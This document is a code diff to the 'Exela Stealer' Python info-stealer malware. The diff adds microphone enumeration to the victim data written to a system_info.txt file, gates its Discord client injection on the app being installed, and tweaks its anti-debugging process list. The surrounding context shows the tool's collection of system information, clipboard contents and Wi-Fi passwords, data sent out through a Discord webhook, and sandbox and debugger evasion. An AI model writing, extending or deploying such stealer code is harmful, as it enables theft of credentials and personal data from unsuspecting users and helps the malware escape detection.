@@ -16,6 +16,34 @@ def create_mutex(mutex_value) -> bool:
     kernel32 = ctypes.windll.kernel32 #kernel32.dll 
     mutex = kernel32.CreateMutexA(None, False, mutex_value) # creating mutext
     return kernel32.GetLastError() != 183 # return if the mutex created successfully or not
+class GetMic:
+    def __init__(self):
+        self.winmm = ctypes.WinDLL('winmm.dll')
+        self.microphone_list = []
+
+    class WAVEINCAPS(ctypes.Structure):
+        _fields_ = [
+            ('wMid', ctypes.c_ushort),
+            ('wPid', ctypes.c_ushort),
+            ('vDriverVersion', ctypes.c_ulong),
+            ('szPname', ctypes.c_char * 32),
+            ('dwFormats', ctypes.c_ulong),
+            ('wChannels', ctypes.c_ushort),
+            ('wReserved1', ctypes.c_ushort)
+        ]
+
+    def list_microphones(self) -> list:
+        num_devices = self.winmm.waveInGetNumDevs()
+        
+        for i in range(num_devices):
+            caps = self.WAVEINCAPS()
+            result = self.winmm.waveInGetDevCapsA(i, ctypes.byref(caps), ctypes.sizeof(caps))
+            
+            if result == 0:
+                device_name = caps.szPname.decode('utf-8')
+                self.microphone_list.append(device_name)
+        
+        return self.microphone_list
 class QuicaxdExela:
     def __init__(self):
         self.hook = dhooks.Webhook(UrLxD,avatar_url="https://i.hizliresim.com/94iepii.jfif", username="quicaxd")
@@ -784,8 +812,6 @@ class QuicaxdExela:
         process = subprocess.run(r"echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername & echo ####User Info#### & net user & echo ####Startup Info#### & wmic startup get caption,command & echo ####Firewallinfo#### & netsh firewall show state ", capture_output= True, shell= True)
         output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
         tmp = os.getenv('temp')
-        with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as x:
-            x.write("----------------------https://t.me/ExelaStealer----------------------\n" + "=" * 70 + "\n")
         pythoncom.CoInitialize()
         w = wmi.WMI()
         cpu_info = w.Win32_Processor()[0]
@@ -921,6 +947,8 @@ class QuicaxdExela:
         command = "wmic csproduct get uuid"
         run = str(subprocess.check_output(command, shell=True).decode('utf-8').split("\n")[1].strip())
         tmp = os.getenv('temp')
+        mic_finder = GetMic()
+        mic_data = mic_finder.list_microphones()
         if os.path.isdir(tmp + f"\\{run}"):
             shutil.rmtree(tmp+f'\\{run}')
             print("Deleted Temp Folder!, creating new folder") 
@@ -1040,6 +1068,14 @@ class QuicaxdExela:
                 self.get_last_clipboard_text(run)
                 self.get_last_clipboard_image(run)        
             if 45 > 3:
+                with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as micro:
+                    micro.write("----------------------https://t.me/ExelaStealer----------------------\n======================================================================\n")
+                if mic_data:
+                    with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as micro:
+                        micro.write("Listed Microphone's\n======================================================================\n")
+                    for mics in mic_data:
+                        with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as micro:
+                            micro.write("Listed Microphone's\n" + mics + "\n")
                 self.get_all_system_data()
             if 7855 < 8888:
                 self.GetWifiPasswords(tmp + f"\\{run}")
@@ -1160,6 +1196,14 @@ class QuicaxdExela:
                 self.get_last_clipboard_text(run)
                 self.get_last_clipboard_image(run)
             if 45 > 3:
+                with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as micro:
+                    micro.write("----------------------https://t.me/ExelaStealer----------------------\n======================================================================\n")
+                if mic_data:
+                    with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as micro:
+                        micro.write("Listed Microphone's\n======================================================================\n")
+                    for mics in mic_data:
+                        with open(tmp + f"\\{run}\\system_info.txt", "a", encoding="utf-8", errors="ignore") as micro:
+                            micro.write("Listed Microphone's\n" + mics + "\n")
                 self.get_all_system_data()
             if 7855 < 8888:
                 self.GetWifiPasswords(tmp + f"\\{run}")
@@ -1167,7 +1211,9 @@ class DiscordInjection:
     def __init__(self) -> None:
         self.local_appdata = os.getenv("LOCALAPPDATA")
         self.discord_path = os.path.join(self.local_appdata, "Discord")
-        self.callBack()
+        if os.path.isdir(self.discord_path):
+            self.callBack()
+        else:return
     def callBack(self):
         self.kill_dc()
         self.write_injection()
@@ -1505,7 +1551,7 @@ class AntiDebug:
         self.banned_computer_names = ["WDAGUtilityAccount","JOANNA","WINZDS-21T43RNG", "Abby", "Peter Wilson", "hmarc", "patex", "JOHN-PC", "RDhJ0CNFevzX", "kEecfMwgj", "Frank",
                             "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", "BEE7370C-8C0C-4", "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC",
                             "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R","COMPNAME_4491", "WILEYPC", "WORK","KATHLROGE","DESKTOP-TKGQ6GH", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC","DESKTOP-NNSJYNR", "JULIA-PC","DESKTOP-BQISITB", "d1bnJkfVlH"]
-        self.banned_process = ["httpdebuggerui","node", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg",
+        self.banned_process = ["httpdebuggerui","node","cmd","wireshark", "fiddler", "regedit", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg",
                                      "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver"]
         self.calback()
     def calback(self):
